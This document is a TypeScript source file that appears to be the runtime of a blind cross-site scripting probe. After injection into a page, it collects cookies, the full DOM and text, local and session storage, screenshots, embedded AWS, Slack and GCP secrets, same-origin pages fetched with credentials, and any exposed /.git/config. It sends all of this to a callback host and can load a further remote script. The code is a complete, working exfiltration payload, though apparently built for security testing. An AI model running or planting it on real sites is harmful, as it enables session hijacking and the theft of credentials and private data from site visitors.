import { encodeScreenshot, renderScreenshot, screenshotByteBudget, type RenderProfile } from './screenshot';

type ProbeConfig = {
  callback: string;
  injectionKey: string;
  captureCookies: boolean;
  captureDom: boolean;
  captureScreenshot: boolean;
  captureStorage: boolean;
  probeChecks: boolean;
  pagePaths: string[];
  chainloadUrl: string;
  maxCaptureBytes?: number;
};

type SecretFinding = { type: string; value: string };
type StorageEntry = { key: string; value: string };
type ScreenshotDiagnostics = {
  requested: boolean;
  status: string;
  canvasWidth?: number;
  canvasHeight?: number;
  budgetBytes?: number;
  encodedBytes?: number;
};

const scriptElement = document.currentScript as HTMLScriptElement | null;

function decodeConfig(): ProbeConfig | null {
  try {
    if (!scriptElement?.src) return null;
    const runtimeUrl = new URL(scriptElement.src);
    const encodedConfig = runtimeUrl.searchParams.get('config');
    if (!encodedConfig) return null;
    const padded = encodedConfig.replace(/-/g, '+').replace(/_/g, '/') + '==='.slice((encodedConfig.length + 3) % 4);
    const binary = atob(padded);
    const bytes = Uint8Array.from(binary, (character) => character.charCodeAt(0));
    const decoded = JSON.parse(new TextDecoder().decode(bytes)) as ProbeConfig;
    const callback = new URL(decoded.callback);
    const runtimeToken = /^\/probe-runtime\/([A-Za-z0-9_-]{40,80})\.js$/.exec(runtimeUrl.pathname)?.[1];
    const callbackToken = /^\/c\/([A-Za-z0-9_-]{40,80})$/.exec(callback.pathname)?.[1];
    const runtimeAlias = /^\/probe-runtime\/a\/([A-Za-z0-9_-]{22})\.js$/.exec(runtimeUrl.pathname)?.[1];
    const callbackAlias = /^\/c\/a\/([A-Za-z0-9_-]{22})$/.exec(callback.pathname)?.[1];
    const matchingCredential =
      Boolean(runtimeToken && runtimeToken === callbackToken)
      || Boolean(runtimeAlias && runtimeAlias === callbackAlias);
    if (!matchingCredential || callback.origin !== runtimeUrl.origin) return null;
    return decoded;
  } catch {
    return null;
  }
}

const config = decodeConfig();

const safeString = (read: () => unknown, max = 8_192): string => {
  try {
    const value = String(read() ?? '');
    return value.length > max ? value.slice(0, max) : value;
  } catch {
    return '';
  }
};

function randomProbeId(): string {
  try {
    return crypto.randomUUID();
  } catch {
    const bytes = crypto.getRandomValues(new Uint8Array(16));
    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, '0')).join('');
  }
}

function findSecrets(html: string): SecretFinding[] {
  const patterns: Array<[string, RegExp]> = [
    ['aws_access_key_id', /\b(?:AKIA|ABIA|ACCA|ASIA)[A-Z0-9]{16}\b/g],
    ['slack_webhook', /https:\/\/hooks\.slack\.com\/services\/[A-Za-z0-9_+\/-]{30,180}/g],
    ['gcp_service_account', /"type"\s*:\s*"service_account"[\s\S]{0,1500}?"private_key_id"\s*:\s*"([a-f0-9]{20,})"/gi],
  ];
  const findings: SecretFinding[] = [];
  for (const [type, pattern] of patterns) {
    for (const match of html.matchAll(pattern)) {
      findings.push({ type, value: String(match[0]).slice(0, 2_048) });
      if (findings.length >= 20) return findings;
    }
  }
  return findings;
}

function collectWebStorage(readStorage: () => Storage): StorageEntry[] {
  const entries: StorageEntry[] = [];
  const encoder = new TextEncoder();
  let totalBytes = 2;
  try {
    const storage = readStorage();
    const count = Math.min(storage.length, 100);
    for (let index = 0; index < count; index += 1) {
      const rawKey = storage.key(index);
      if (rawKey === null) continue;
      const key = rawKey.slice(0, 1_024);
      const value = String(storage.getItem(rawKey) ?? '').slice(0, 32_768);
      const entry = { key, value };
      const entryBytes = encoder.encode(JSON.stringify(entry)).byteLength + (entries.length > 0 ? 1 : 0);
      if (totalBytes + entryBytes > 131_072) break;
      entries.push(entry);
      totalBytes += entryBytes;
    }
  } catch {
    return [];
  }
  return entries;
}

async function withTimeout<T>(task: (signal: AbortSignal) => Promise<T>, milliseconds = 1_500): Promise<T> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), milliseconds);
  try {
    return await task(controller.signal);
  } finally {
    clearTimeout(timer);
  }
}

async function collectPages(paths: string[]): Promise<Array<{ path: string; url: string; status: number; body: string }>> {
  const tasks = paths.slice(0, 3).map(async (path) => {
    if (!/^\/[A-Za-z0-9_./?=&%~-]{0,300}$/.test(path) || path.startsWith('//')) return null;
    try {
      const response = await withTimeout((signal) =>
        fetch(new URL(path, location.origin), { credentials: 'include', redirect: 'follow', signal }),
      );
      const body = (await response.text()).slice(0, 131_072);
      return { path, url: response.url.slice(0, 2_048), status: response.status, body };
    } catch {
      // Collection failures are intentionally ignored.
      return null;
    }
  });
  return (await Promise.all(tasks)).filter(
    (result): result is { path: string; url: string; status: number; body: string } => result !== null,
  );
}

async function collectChecks(): Promise<{ cors: string | false; gitExposed: string | false }> {
  const corsTask = (async (): Promise<string | false> => {
    try {
    const response = await withTimeout((signal) =>
      fetch(location.href, { method: 'HEAD', credentials: 'include', redirect: 'manual', signal }),
    );
      return response.headers.get('Access-Control-Allow-Origin')?.slice(0, 512) || false;
    } catch { return false; }
  })();
  const gitTask = (async (): Promise<string | false> => {
    try {
      const response = await withTimeout((signal) =>
        fetch(new URL('/.git/config', location.origin), { credentials: 'include', redirect: 'manual', signal }),
      );
      const text = (await response.text()).slice(0, 5_000);
      return response.ok && /^\s*\[core\]/.test(text) ? text : false;
    } catch { return false; }
  })();
  const [cors, gitExposed] = await Promise.all([corsTask, gitTask]);
  return { cors, gitExposed };
}

async function collectScreenshot(
  eventBytes: number,
  profile: RenderProfile,
): Promise<{ image: Blob | null; diagnostics: ScreenshotDiagnostics }> {
  if (!config?.captureScreenshot) return { image: null, diagnostics: { requested: false, status: 'disabled' } };

  const { canvas, strategy } = await renderScreenshot(profile);
  if (!canvas) return { image: null, diagnostics: { requested: true, status: `${profile}_render_failed` } };

  const budgetBytes = screenshotByteBudget(eventBytes, config.maxCaptureBytes);
  const baseDiagnostics = {
    requested: true,
    status: strategy ? `${profile}_rendered:${strategy}` : `${profile}_rendered`,
    canvasWidth: Math.max(0, Math.min(100_000, canvas.width || 0)),
    canvasHeight: Math.max(0, Math.min(100_000, canvas.height || 0)),
    budgetBytes,
  };
  const image = await encodeScreenshot(canvas, budgetBytes);
  return {
    image,
    diagnostics: image
      ? { ...baseDiagnostics, status: strategy ? `${profile}_encoded:${strategy}` : `${profile}_encoded`, encodedBytes: image.size }
      : { ...baseDiagnostics, status: budgetBytes > 0 ? `${profile}_encode_failed` : `${profile}_no_budget` },
  };
}

async function postCaptureEvent(eventJson: string, image?: Blob): Promise<void> {
  if (!config || !/^https?:\/\//.test(config.callback)) return;
  const form = new FormData();
  form.append('event', eventJson);
  if (image) form.append('screenshot', image, 'capture.jpg');
  try {
    await fetch(config.callback, {
      method: 'POST',
      mode: 'no-cors',
      credentials: 'omit',
      redirect: 'follow',
      body: form,
    });
  } catch {
    // Blind callbacks cannot safely surface transport errors.
  }
}

async function fire(): Promise<void> {
  if (!config || !/^https?:\/\//.test(config.callback)) return;
  const html = config.captureDom ? safeString(() => document.documentElement.outerHTML, 524_288) : '';
  const [pages, checks] = await Promise.all([
    config.captureDom && config.pagePaths.length > 0 ? collectPages(config.pagePaths) : Promise.resolve([]),
    config.probeChecks ? collectChecks() : Promise.resolve({ cors: false as const, gitExposed: false as const }),
  ]);
  const eventBase = {
    schemaVersion: 1 as const,
    probeUid: randomProbeId(),
    injectionKey: config.injectionKey.slice(0, 256),
    url: safeString(() => location.href, 8_192),
    origin: safeString(() => location.origin, 2_048),
    referrer: safeString(() => document.referrer, 8_192),
    userAgent: safeString(() => navigator.userAgent, 2_048),
    title: safeString(() => document.title, 1_024),
    browserTime: Date.now(),
    wasIframe: safeString(() => window.top !== window) === 'true',
    cookies: config.captureCookies ? safeString(() => document.cookie, 65_536) : '',
    domHtml: html,
    domText: config.captureDom ? safeString(() => document.body?.innerText, 262_144) : '',
    localStorage: config.captureStorage ? collectWebStorage(() => window.localStorage) : [],
    sessionStorage: config.captureStorage ? collectWebStorage(() => window.sessionStorage) : [],
    viewport: {
      width: Math.max(0, Math.min(100_000, window.innerWidth || 0)),
      height: Math.max(0, Math.min(100_000, window.innerHeight || 0)),
      devicePixelRatio: Math.max(0, Math.min(10, window.devicePixelRatio || 1)),
    },
    secrets: findSecrets(html),
    cors: checks.cors,
    gitExposed: checks.gitExposed,
    pages,
  };

  const initialDiagnostics: ScreenshotDiagnostics = config.captureScreenshot
    ? { requested: true, status: 'deferred' }
    : { requested: false, status: 'disabled' };
  await postCaptureEvent(JSON.stringify({ ...eventBase, screenshotDiagnostics: initialDiagnostics }));

  if (!config.captureScreenshot) return;

  const eventBaseJson = JSON.stringify(eventBase);
  const eventBytes = new TextEncoder().encode(eventBaseJson).byteLength;

  const fastAttempt = await collectScreenshot(eventBytes, 'fast');
  if (fastAttempt.image) {
    await postCaptureEvent(
      JSON.stringify({
        ...eventBase,
        screenshotDiagnostics: {
          ...fastAttempt.diagnostics,
          status: fastAttempt.diagnostics.status.startsWith('fast_encoded')
            ? fastAttempt.diagnostics.status.replace('fast_encoded', 'followup_encoded')
            : fastAttempt.diagnostics.status,
        },
      }),
      fastAttempt.image,
    );
    return;
  }

  const reliableAttempt = await collectScreenshot(eventBytes, 'reliable');
  if (!reliableAttempt.image) return;

  await postCaptureEvent(
    JSON.stringify({
      ...eventBase,
      screenshotDiagnostics: {
        ...reliableAttempt.diagnostics,
        status: reliableAttempt.diagnostics.status.startsWith('reliable_encoded')
          ? reliableAttempt.diagnostics.status.replace('reliable_encoded', 'followup_encoded')
          : reliableAttempt.diagnostics.status,
      },
    }),
    reliableAttempt.image,
  );
}

function chainload(): void {
  if (!config?.chainloadUrl || !/^https:\/\//i.test(config.chainloadUrl)) return;
  try {
    const element = document.createElement('script');
    element.src = config.chainloadUrl;
    element.referrerPolicy = 'no-referrer';
    document.head.appendChild(element);
  } catch {
    // Ignore.
  }
}

function start(): void {
  chainload();
  void fire();
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', start, { once: true });
} else {
  start();
}
